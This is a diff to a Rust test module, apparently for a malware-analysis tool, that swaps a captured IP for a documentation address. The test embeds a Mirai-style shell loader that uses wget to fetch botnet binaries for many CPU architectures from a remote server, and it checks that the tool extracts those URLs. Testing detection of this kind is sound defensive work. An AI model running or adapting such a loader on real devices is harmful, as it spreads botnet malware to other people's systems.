@@ -478,7 +478,7 @@ mod tests {
     fn expands_interpolated_arch_loop_from_a_real_captured_loader() {
         let s = br#"#!/bin/sh
 ARCHS="arm arm5 arm7 mips mpsl sh4 m68k ppc ppc440fp spc"
-SERVER="185.93.89.72"
+SERVER="198.51.100.72"
 for arch in $ARCHS; do
   (wget "http://$SERVER/mirai.$arch" -O- || busybox wget "http://$SERVER/mirai.$arch" -O-) > hDvrHelper
 done
@@ -489,7 +489,7 @@ done
             "arm", "arm5", "arm7", "mips", "mpsl", "sh4", "m68k", "ppc", "ppc440fp", "spc",
         ];
         for arch in expected {
-            let want = format!("http://185.93.89.72/mirai.{arch}");
+            let want = format!("http://198.51.100.72/mirai.{arch}");
             assert!(urls.contains(&want), "missing {want} in {urls:?}");
         }
         assert_eq!(
